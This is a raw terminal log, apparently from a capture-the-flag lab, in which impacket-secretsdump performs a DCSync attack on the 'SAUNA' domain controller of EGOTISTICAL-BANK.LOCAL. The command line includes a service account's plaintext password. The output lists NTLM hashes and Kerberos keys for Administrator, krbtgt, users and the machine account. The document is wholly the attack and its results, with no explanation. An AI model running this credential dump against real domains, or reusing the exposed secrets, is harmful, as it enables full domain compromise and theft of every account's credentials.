```sh
└─$ impacket-secretsdump -ts 'EGOTISTICAL-BANK.LOCAL/svc_loanmgr:Moneymakestheworldgoround!@10.129.95.180' -debug                          
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[2025-08-08 11:30:49] [+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[2025-08-08 11:30:53] [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[2025-08-08 11:30:55] [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[2025-08-08 11:30:55] [*] Using the DRSUAPI method to get NTDS.DIT secrets
[2025-08-08 11:30:55] [+] Session resume file will be sessionresume_BeeTsklm
[2025-08-08 11:31:00] [+] Calling DRSGetNCChanges for S-1-5-21-2966785786-3096785034-1186376766-500 
[2025-08-08 11:31:01] [+] SID lookup unsuccessful, falling back to DRSCrackNames/GUID lookups
[2025-08-08 11:31:01] [+] Calling DRSCrackNames for S-1-5-21-2966785786-3096785034-1186376766-500 
[2025-08-08 11:31:01] [+] Calling DRSGetNCChanges for {21368e06-7c54-4cd5-9421-8186a6d29f66} 
[2025-08-08 11:31:02] [+] Entering NTDSHashes.__decryptHash
[2025-08-08 11:31:02] [+] Decrypting hash for user: CN=Administrator,CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
[2025-08-08 11:31:02] [+] Leaving NTDSHashes.__decryptHash
[2025-08-08 11:31:02] [+] Entering NTDSHashes.__decryptSupplementalInfo
[2025-08-08 11:31:02] [+] Leaving NTDSHashes.__decryptSupplementalInfo
[2025-08-08 11:31:02] [+] Calling DRSCrackNames for S-1-5-21-2966785786-3096785034-1186376766-501 
[2025-08-08 11:31:02] [+] Calling DRSGetNCChanges for {b1298768-336d-40ba-a901-1da65816b899} 
[2025-08-08 11:31:03] [+] Entering NTDSHashes.__decryptHash
[2025-08-08 11:31:03] [+] Decrypting hash for user: CN=Guest,CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[2025-08-08 11:31:03] [+] Leaving NTDSHashes.__decryptHash
[2025-08-08 11:31:03] [+] Entering NTDSHashes.__decryptSupplementalInfo
[2025-08-08 11:31:03] [+] Leaving NTDSHashes.__decryptSupplementalInfo
[2025-08-08 11:31:03] [+] Calling DRSCrackNames for S-1-5-21-2966785786-3096785034-1186376766-502 
[2025-08-08 11:31:03] [+] Calling DRSGetNCChanges for {63708f6a-ff17-4c00-9d92-dae7b3f739ec} 
[2025-08-08 11:31:04] [+] Entering NTDSHashes.__decryptHash
[2025-08-08 11:31:04] [+] Decrypting hash for user: CN=krbtgt,CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
[2025-08-08 11:31:04] [+] Leaving NTDSHashes.__decryptHash
[2025-08-08 11:31:04] [+] Entering NTDSHashes.__decryptSupplementalInfo
[2025-08-08 11:31:04] [+] Leaving NTDSHashes.__decryptSupplementalInfo
[2025-08-08 11:31:04] [+] Calling DRSCrackNames for S-1-5-21-2966785786-3096785034-1186376766-1103 
[2025-08-08 11:31:04] [+] Calling DRSGetNCChanges for {9283072d-a2e1-4f8b-a34b-a16d6a979fa3} 
[2025-08-08 11:31:05] [+] Entering NTDSHashes.__decryptHash
[2025-08-08 11:31:05] [+] Decrypting hash for user: CN=Hugo Smith,DC=EGOTISTICAL-BANK,DC=LOCAL
EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
[2025-08-08 11:31:05] [+] Leaving NTDSHashes.__decryptHash
[2025-08-08 11:31:05] [+] Entering NTDSHashes.__decryptSupplementalInfo
[2025-08-08 11:31:05] [+] Leaving NTDSHashes.__decryptSupplementalInfo
[2025-08-08 11:31:05] [+] Calling DRSCrackNames for S-1-5-21-2966785786-3096785034-1186376766-1105 
[2025-08-08 11:31:05] [+] Calling DRSGetNCChanges for {b6a6403e-a7df-4abf-92fb-b5bf1a5e3aed} 
[2025-08-08 11:31:06] [+] Entering NTDSHashes.__decryptHash
[2025-08-08 11:31:06] [+] Decrypting hash for user: CN=Fergus Smith,CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL
EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
[2025-08-08 11:31:06] [+] Leaving NTDSHashes.__decryptHash
[2025-08-08 11:31:06] [+] Entering NTDSHashes.__decryptSupplementalInfo
[2025-08-08 11:31:06] [+] Leaving NTDSHashes.__decryptSupplementalInfo
[2025-08-08 11:31:06] [+] Calling DRSCrackNames for S-1-5-21-2966785786-3096785034-1186376766-1108 
[2025-08-08 11:31:06] [+] Calling DRSGetNCChanges for {c84a4266-b01d-4a64-8c2d-ed930d18c489} 
[2025-08-08 11:31:06] [+] Entering NTDSHashes.__decryptHash
[2025-08-08 11:31:06] [+] Decrypting hash for user: CN=L Manager,CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
[2025-08-08 11:31:06] [+] Leaving NTDSHashes.__decryptHash
[2025-08-08 11:31:06] [+] Entering NTDSHashes.__decryptSupplementalInfo
[2025-08-08 11:31:06] [+] Leaving NTDSHashes.__decryptSupplementalInfo
[2025-08-08 11:31:06] [+] Calling DRSCrackNames for S-1-5-21-2966785786-3096785034-1186376766-1000 
[2025-08-08 11:31:07] [+] Calling DRSGetNCChanges for {9f1d1db5-ce78-498d-aa90-16781495f771} 
[2025-08-08 11:31:07] [+] Entering NTDSHashes.__decryptHash
[2025-08-08 11:31:07] [+] Decrypting hash for user: CN=SAUNA,OU=Domain Controllers,DC=EGOTISTICAL-BANK,DC=LOCAL
SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:7504784e68bb600a12667dc85792f5c1:::
[2025-08-08 11:31:07] [+] Leaving NTDSHashes.__decryptHash
[2025-08-08 11:31:07] [+] Entering NTDSHashes.__decryptSupplementalInfo
[2025-08-08 11:31:07] [+] Leaving NTDSHashes.__decryptSupplementalInfo
[2025-08-08 11:31:07] [+] Finished processing and printing user's hashes, now printing supplemental information
[2025-08-08 11:31:07] [*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:42ee4a7abee32410f470fed37ae9660535ac56eeb73928ec783b015d623fc657
Administrator:aes128-cts-hmac-sha1-96:a9f3769c592a8a231c3c972c4050be4e
Administrator:des-cbc-md5:fb8f321c64cea87f
krbtgt:aes256-cts-hmac-sha1-96:83c18194bf8bd3949d4d0d94584b868b9d5f2a54d3d6f3012fe0921585519f24
krbtgt:aes128-cts-hmac-sha1-96:c824894df4c4c621394c079b42032fa9
krbtgt:des-cbc-md5:c170d5dc3edfc1d9
EGOTISTICAL-BANK.LOCAL\HSmith:aes256-cts-hmac-sha1-96:5875ff00ac5e82869de5143417dc51e2a7acefae665f50ed840a112f15963324
EGOTISTICAL-BANK.LOCAL\HSmith:aes128-cts-hmac-sha1-96:909929b037d273e6a8828c362faa59e9
EGOTISTICAL-BANK.LOCAL\HSmith:des-cbc-md5:1c73b99168d3f8c7
EGOTISTICAL-BANK.LOCAL\FSmith:aes256-cts-hmac-sha1-96:8bb69cf20ac8e4dddb4b8065d6d622ec805848922026586878422af67ebd61e2
EGOTISTICAL-BANK.LOCAL\FSmith:aes128-cts-hmac-sha1-96:6c6b07440ed43f8d15e671846d5b843b
EGOTISTICAL-BANK.LOCAL\FSmith:des-cbc-md5:b50e02ab0d85f76b
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes256-cts-hmac-sha1-96:6f7fd4e71acd990a534bf98df1cb8be43cb476b00a8b4495e2538cff2efaacba
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes128-cts-hmac-sha1-96:8ea32a31a1e22cb272870d79ca6d972c
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:des-cbc-md5:2a896d16c28cf4a2
SAUNA$:aes256-cts-hmac-sha1-96:61155c90d28dfdea0aa2a08137574ce725e848688c5b75ce6dea57ae6cf41358
SAUNA$:aes128-cts-hmac-sha1-96:bb87c1e28416c3423848c16da0893d55
SAUNA$:des-cbc-md5:623143264c38bac7
[2025-08-08 11:31:07] [*] Cleaning up..
```
